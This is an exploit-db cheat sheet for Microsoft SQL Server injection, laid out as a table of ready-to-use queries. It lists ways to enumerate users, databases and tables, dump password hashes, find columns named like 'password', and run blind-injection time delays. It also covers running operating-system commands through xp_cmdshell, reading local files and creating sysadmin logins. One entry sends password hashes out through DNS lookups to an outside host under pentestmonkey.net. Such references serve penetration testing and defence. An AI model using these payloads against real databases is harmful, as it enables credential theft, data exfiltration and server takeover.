<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>exploit-db paper</title>
</head><body>########################################&#09;<br/>
&nbsp;[0x05] - MSSQL Injection Cheat Sheet<br/>
########################################<br/>
&nbsp;<br/>
&#09;&#09;** Some of the queries in the table below can only be run by an admin (SA Privilege). <br/>
&#09;These are marked with "-- priv" at the end of the query. **<br/>
<br/>
&#09;+---------------+---------------------------------------------------------------------------+<br/>
&#09;| &nbsp; &nbsp;Version &nbsp; &nbsp;| SELECT @@version&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;| &nbsp; Comments &nbsp; &nbsp;| SELECT 1 -- comment&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;| &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | SELECT /*comment*/1&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;|&#09;&#09;| SELECT user_name();&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;| &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | SELECT system_user;&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;| Current User&#09;| SELECT user;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;| &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;| &nbsp;List Users &nbsp; | SELECT name FROM master..syslogins&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;|&#09;&#09;| MSSQL2000: SELECT name, password FROM master..sysxlogins -- priv&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;|&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;| &nbsp; &nbsp;&#09;&#09;|&#09; &nbsp; &nbsp; SELECT name, master.dbo.fn_varbintohexstr(password) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|<br/>
&#09;| &#09;&#09;|&#09; &nbsp; &nbsp; FROM master..sysxlogins -- priv&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;| List Password |&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;| &nbsp; &nbsp;Hashes&#09;| MSSQL2005: SELECT name, password_hash FROM&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;|&#09; &nbsp; &nbsp; master.sys.sql_logins -- priv&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;| &nbsp; &nbsp;&#09;&#09;|&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;|&#09; &nbsp; &nbsp; SELECT name + '-' +&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;|&#09; &nbsp; &nbsp; master.sys.fn_varbintohexstr(password_hash)&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;|&#09; &nbsp; &nbsp; FROM master.sys.sql_logins -- priv&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;| &#09;&#09;| SELECT is_srvrolemember('sysadmin'); -- is your account a sysadmin?&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;| returns 1 for true, 0 for false, NULL for invalid role.&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;| Also try 'bulkadmin',&#09;'systemadmin' and other values.&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;| &nbsp; List DBA&#09;| &#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;| &nbsp; Accounts&#09;|&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;| &#09;&#09;| SELECT is_srvrolemember('sysadmin', 'sa'); -- is sa a sysadmin?&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;| return 1 for true, 0 for false, NULL for invalid role/username.&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;| &nbsp; Current DB &nbsp;| SELECT DB_NAME()&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;| &nbsp; &nbsp; List&#09;| SELECT name FROM master..sysdatabases;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;| &nbsp; Databases&#09;| SELECT DB_NAME(N); -- for N = 0, 1, 2, ...&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;|&#09;&#09;| SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE &nbsp; |&#09;&#09;&#09; &nbsp; &nbsp;<br/>
&#09;|&#09;&#09;| name = 'mytable'); -- for the current DB only&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;|&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;| List Columns&#09;| SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM &nbsp;|<br/>
&#09;|&#09;&#09;| master..syscolumns, master..sysobjects WHERE&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;| master..syscolumns.id=master..sysobjects.id AND&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;| master..sysobjects.name='sometable'; -- list colum names&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;| and types for master..sometable&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;|&#09;&#09;| SELECT name FROM master..sysobjects WHERE xtype = 'U';&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;| (Use xtype = 'V' for views)&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;| SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;|&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;| &nbsp;List Tables&#09;| SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype)&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;| FROM master..syscolumns, master..sysobjects WHERE&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;| master..syscolumns.id=master..sysobjects.id AND&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;| master..sysobjects.name='sometable'; -- list column names and types&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;| for master..sometable&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;| &#09;&#09;| -- NB: This example works only for the current database.&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;| If you wan't to search another db, you need to specify the db name&#09; &nbsp; &nbsp;|<br/>
&#09;| &nbsp;Find Tables&#09;| (e.g. replace sysobject with mydb..sysobjects).&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;| &nbsp; &nbsp; From&#09;|&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;| &nbsp;Column Name&#09;| SELECT sysobjects.name as tablename, syscolumns.name as columnname&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;| FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;| WHERE sysobjects.xtype = 'U' AND syscolumns.name LIKE '%PASSWORD%' --&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;| this lists table, column for each column containing the word 'password' &nbsp; |<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;| &nbsp; &nbsp;Select&#09;| SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins&#09; &nbsp; &nbsp;|<br/>
&#09;| &nbsp; &nbsp;Nth Row&#09;| ORDER BY name ASC) sq ORDER BY name DESC -- gets 9th row&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;|Select Nth Char| SELECT substring('abcd', 3, 1) -- returns c&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;| &nbsp;Bitwise AND &nbsp;| SELECT 6 &amp; 2 -- returns 2&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;| SELECT 6 &amp; 1 -- returns 0&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;| &nbsp;ASCII Value&#09;| SELECT char(0x41) -- returns A&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;| &nbsp; -&gt; Char&#09;|&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;| Char -&gt; ASCII | SELECT ascii('A') - returns 65&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;| &nbsp; &nbsp; Value&#09;|&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;| &nbsp; &nbsp;Casting &nbsp; &nbsp;| SELECT CAST('1' as int);&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;| SELECT CAST(1 as char)&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;| &nbsp; &nbsp;String&#09;| SELECT 'A' + 'B' - returns AB&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;| Concatenation |&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;| If Statement &nbsp;| IF (1=1) SELECT 1 ELSE SELECT 2 -- returns 1&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;|Case Statement | SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END -- returns 1&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;|Avoiding Quotes| SELECT char(65)+char(66) -- returns AB&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;| &nbsp;Time Delay &nbsp; | WAITFOR DELAY '0:0:5' -- pause for 5 seconds&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;|&#09;&#09;| declare @host varchar(800); select @host = name FROM master..syslogins; &nbsp; |<br/>
&#09;|&#09;&#09;| exec('master..xp_getfiledetails ''\\' + @host + '\c$\boot.ini''');&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;| -- nonpriv, works on 2000&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;|&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;| declare @host varchar(800); select @host = name + '-' +&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;| &nbsp; &nbsp; Make&#09;| master.sys.fn_varbintohexstr(password_hash) + '.2.pentestmonkey.net'&#09; &nbsp; &nbsp;|<br/>
&#09;| DNS Requests&#09;| from sys.sql_logins; exec('xp_fileexist ''\\' + @host + '\c$\boot.ini''');|<br/>
&#09;|&#09;&#09;| -- priv, works on 2005&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;|&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;| -- NB: Concatenation is not allowed in calls to these SPs, hence why we &nbsp; |<br/>
&#09;|&#09;&#09;| have to use @host. &nbsp;Messy but necessary.&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;| -- Also check out theDNS tunnel feature of sqlninja&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;| &nbsp; &nbsp;Command&#09;| EXEC xp_cmdshell 'net user'; -- priv&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;| &nbsp; Execution &nbsp; |&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;| &nbsp; &nbsp; Local&#09;| CREATE TABLE mydata (line varchar(8000));&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;| &nbsp;File Access&#09;| BULK INSERT mydata FROM 'c:\boot.ini';&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|&#09;&#09;| DROP TABLE mydata;&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;| Hostname, IP &nbsp;| SELECT HOST_NAME()&#09;&#09;&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;| Create Users &nbsp;| EXEC sp_addlogin 'user', 'pass'; -- priv&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;| &nbsp;Drop Users &nbsp; | EXEC sp_droplogin 'user'; -- priv&#09;&#09;&#09;&#09;&#09; &nbsp; &nbsp;|<br/>
&#09;|---------------|---------------------------------------------------------------------------|<br/>
&#09;| Make User DBA | EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin; -- priv&#09; &nbsp; &nbsp;|<br/>
&#09;+---------------+---------------------------------------------------------------------------+</body></html>